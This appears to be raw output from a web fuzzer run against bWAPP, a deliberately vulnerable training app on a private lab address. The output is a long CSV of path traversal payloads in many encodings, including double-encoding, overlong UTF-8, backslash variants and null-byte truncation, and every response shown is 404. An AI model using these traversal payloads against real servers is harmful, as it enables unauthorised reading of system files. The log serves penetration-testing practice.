470,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE};index.html
704,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e/{FILE}
705,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}
469,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c..%255c{FILE};index.html
486,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE};index.html
488,404,9L,39W,http://192.168.1.86/bWAPP/\../{FILE}
485,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE};index.html
128,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae/{FILE}
25,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/{FILE}
714,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}
713,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}
711,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}
453,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE};index.html
452,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE};index.html
343,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}%00index.html
40,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
52,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
337,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\{FILE}%00index.html
471,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE};index.html
51,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/{FILE}
80,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE}
715,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}
706,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}
710,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}
719,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}
718,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}
725,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE}
717,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}
716,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}
723,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE}
726,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE}
724,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE}
720,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%5c{FILE}
722,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%5c..%c0%5c..%c0%5c{FILE}
721,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%5c..%c0%5c{FILE}
741,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}
731,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}
733,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}
740,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}
728,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e\{FILE}
737,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}
742,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}
729,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}
767,404,9L,39W,http://192.168.1.86/bWAPP/..//..//..//..//..//..//..//..//{FILE}
768,404,9L,39W,http://192.168.1.86/bWAPP/..///{FILE}
769,404,9L,39W,http://192.168.1.86/bWAPP/..///..///{FILE}
727,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE}
730,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}
709,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}
757,404,9L,39W,http://192.168.1.86/bWAPP/\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
708,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}
707,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}
712,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%2f{FILE}
759,404,9L,39W,http://192.168.1.86/bWAPP/\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
758,404,9L,39W,http://192.168.1.86/bWAPP/\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
777,404,9L,39W,http://192.168.1.86/bWAPP/..\\..\\{FILE}
734,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}
756,404,9L,39W,http://192.168.1.86/bWAPP/\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
755,404,9L,39W,http://192.168.1.86/bWAPP/\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
776,404,9L,39W,http://192.168.1.86/bWAPP/..\\{FILE}
775,404,9L,39W,http://192.168.1.86/bWAPP/..///..///..///..///..///..///..///..///{FILE}
774,404,9L,39W,http://192.168.1.86/bWAPP/..///..///..///..///..///..///..///{FILE}
772,404,9L,39W,http://192.168.1.86/bWAPP/..///..///..///..///..///{FILE}
773,404,9L,39W,http://192.168.1.86/bWAPP/..///..///..///..///..///..///{FILE}
761,404,9L,39W,http://192.168.1.86/bWAPP/..//..//{FILE}
760,404,9L,39W,http://192.168.1.86/bWAPP/..//{FILE}
763,404,9L,39W,http://192.168.1.86/bWAPP/..//..//..//..//{FILE}
762,404,9L,39W,http://192.168.1.86/bWAPP/..//..//..//{FILE}
764,404,9L,39W,http://192.168.1.86/bWAPP/..//..//..//..//..//{FILE}
738,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}
766,404,9L,39W,http://192.168.1.86/bWAPP/..//..//..//..//..//..//..//{FILE}
765,404,9L,39W,http://192.168.1.86/bWAPP/..//..//..//..//..//..//{FILE}
754,404,9L,39W,http://192.168.1.86/bWAPP/\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
751,404,9L,39W,http://192.168.1.86/bWAPP////%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
750,404,9L,39W,http://192.168.1.86/bWAPP////%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
752,404,9L,39W,http://192.168.1.86/bWAPP/\\\%2e%2e%5c{FILE}
770,404,9L,39W,http://192.168.1.86/bWAPP/..///..///..///{FILE}
771,404,9L,39W,http://192.168.1.86/bWAPP/..///..///..///..///{FILE}
778,404,9L,39W,http://192.168.1.86/bWAPP/..\\..\\..\\{FILE}
744,404,9L,39W,http://192.168.1.86/bWAPP////%2e%2e%2f{FILE}
753,404,9L,39W,http://192.168.1.86/bWAPP/\\\%2e%2e%5c%2e%2e%5c{FILE}
779,404,9L,39W,http://192.168.1.86/bWAPP/..\\..\\..\\..\\{FILE}
745,404,9L,39W,http://192.168.1.86/bWAPP////%2e%2e%2f%2e%2e%2f{FILE}
748,404,9L,39W,http://192.168.1.86/bWAPP////%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
746,404,9L,39W,http://192.168.1.86/bWAPP////%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
749,404,9L,39W,http://192.168.1.86/bWAPP////%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
747,404,9L,39W,http://192.168.1.86/bWAPP////%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
736,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%5c{FILE}
743,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}
782,404,9L,39W,http://192.168.1.86/bWAPP/..\\..\\..\\..\\..\\..\\..\\{FILE}
739,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}
735,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}
783,404,9L,39W,http://192.168.1.86/bWAPP/..\\..\\..\\..\\..\\..\\..\\..\\{FILE}
780,404,9L,39W,http://192.168.1.86/bWAPP/..\\..\\..\\..\\..\\{FILE}
781,404,9L,39W,http://192.168.1.86/bWAPP/..\\..\\..\\..\\..\\..\\{FILE}
153,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE}
104,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
784,404,9L,39W,http://192.168.1.86/bWAPP/..\\\{FILE}
138,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE}
350,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}%00index.html
82,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\{FILE}..%5c{FILE}
787,404,9L,39W,http://192.168.1.86/bWAPP/..\\\..\\\..\\\..\\\{FILE}
785,404,9L,39W,http://192.168.1.86/bWAPP/..\\\..\\\{FILE}
786,404,9L,39W,http://192.168.1.86/bWAPP/..\\\..\\\..\\\{FILE}
788,404,9L,39W,http://192.168.1.86/bWAPP/..\\\..\\\..\\\..\\\..\\\{FILE}
334,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE}%00index.html
789,404,9L,39W,http://192.168.1.86/bWAPP/..\\\..\\\..\\\..\\\..\\\..\\\{FILE}
17,404,9L,39W,http://192.168.1.86/bWAPP/..%2f{FILE}
18,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f{FILE}
317,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}%00index.html
790,404,9L,39W,http://192.168.1.86/bWAPP/..\\\..\\\..\\\..\\\..\\\..\\\..\\\{FILE}
791,404,9L,39W,http://192.168.1.86/bWAPP/..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\{FILE}
88,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
101,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
792,404,9L,39W,http://192.168.1.86/bWAPP/./\/./{FILE}
793,404,9L,39W,http://192.168.1.86/bWAPP/./\/././\/./{FILE}
794,404,9L,39W,http://192.168.1.86/bWAPP/./\/././\/././\/./{FILE}
20,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f{FILE}
795,404,9L,39W,http://192.168.1.86/bWAPP/./\/././\/././\/././\/./{FILE}
796,404,9L,39W,http://192.168.1.86/bWAPP/./\/././\/././\/././\/././\/./{FILE}
362,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\{FILE}%00index.html
732,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}
799,404,9L,39W,http://192.168.1.86/bWAPP/./\/././\/././\/././\/././\/././\/././\/././\/./{FILE}
798,404,9L,39W,http://192.168.1.86/bWAPP/./\/././\/././\/././\/././\/././\/././\/./{FILE}
797,404,9L,39W,http://192.168.1.86/bWAPP/./\/././\/././\/././\/././\/././\/./{FILE}
801,404,9L,39W,http://192.168.1.86/bWAPP/.\/\.\.\/\.\{FILE}
800,404,9L,39W,http://192.168.1.86/bWAPP/.\/\.\{FILE}
841,404,9L,39W,http://192.168.1.86/bWAPP/.//..//.//..//{FILE}
842,404,9L,39W,http://192.168.1.86/bWAPP/.//..//.//..//.//..//{FILE}
840,404,9L,39W,http://192.168.1.86/bWAPP/.//..//{FILE}
832,404,9L,39W,http://192.168.1.86/bWAPP/.\..\{FILE}
833,404,9L,39W,http://192.168.1.86/bWAPP/.\..\.\..\{FILE}
854,404,9L,39W,http://192.168.1.86/bWAPP/.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\{FILE}
855,404,9L,39W,http://192.168.1.86/bWAPP/.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\{FILE}
849,404,9L,39W,http://192.168.1.86/bWAPP/.\\..\\.\\..\\{FILE}
850,404,9L,39W,http://192.168.1.86/bWAPP/.\\..\\.\\..\\.\\..\\{FILE}
851,404,9L,39W,http://192.168.1.86/bWAPP/.\\..\\.\\..\\.\\..\\.\\..\\{FILE}
848,404,9L,39W,http://192.168.1.86/bWAPP/.\\..\\{FILE}
836,404,9L,39W,http://192.168.1.86/bWAPP/.\..\.\..\.\..\.\..\.\..\{FILE}
837,404,9L,39W,http://192.168.1.86/bWAPP/.\..\.\..\.\..\.\..\.\..\.\..\{FILE}
834,404,9L,39W,http://192.168.1.86/bWAPP/.\..\.\..\.\..\{FILE}
835,404,9L,39W,http://192.168.1.86/bWAPP/.\..\.\..\.\..\.\..\{FILE}
804,404,9L,39W,http://192.168.1.86/bWAPP/.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\{FILE}
824,404,9L,39W,http://192.168.1.86/bWAPP/./../{FILE}
803,404,9L,39W,http://192.168.1.86/bWAPP/.\/\.\.\/\.\.\/\.\.\/\.\{FILE}
805,404,9L,39W,http://192.168.1.86/bWAPP/.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\{FILE}
806,404,9L,39W,http://192.168.1.86/bWAPP/.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\{FILE}
808,404,9L,39W,http://192.168.1.86/bWAPP/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../{FILE}
807,404,9L,39W,http://192.168.1.86/bWAPP/.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\{FILE}
839,404,9L,39W,http://192.168.1.86/bWAPP/.\..\.\..\.\..\.\..\.\..\.\..\.\..\.\..\{FILE}
844,404,9L,39W,http://192.168.1.86/bWAPP/.//..//.//..//.//..//.//..//.//..//{FILE}
847,404,9L,39W,http://192.168.1.86/bWAPP/.//..//.//..//.//..//.//..//.//..//.//..//.//..//.//..//{FILE}
843,404,9L,39W,http://192.168.1.86/bWAPP/.//..//.//..//.//..//.//..//{FILE}
846,404,9L,39W,http://192.168.1.86/bWAPP/.//..//.//..//.//..//.//..//.//..//.//..//.//..//{FILE}
845,404,9L,39W,http://192.168.1.86/bWAPP/.//..//.//..//.//..//.//..//.//..//.//..//{FILE}
853,404,9L,39W,http://192.168.1.86/bWAPP/.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\{FILE}
852,404,9L,39W,http://192.168.1.86/bWAPP/.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\{FILE}
802,404,9L,39W,http://192.168.1.86/bWAPP/.\/\.\.\/\.\.\/\.\{FILE}
838,404,9L,39W,http://192.168.1.86/bWAPP/.\..\.\..\.\..\.\..\.\..\.\..\.\..\{FILE}
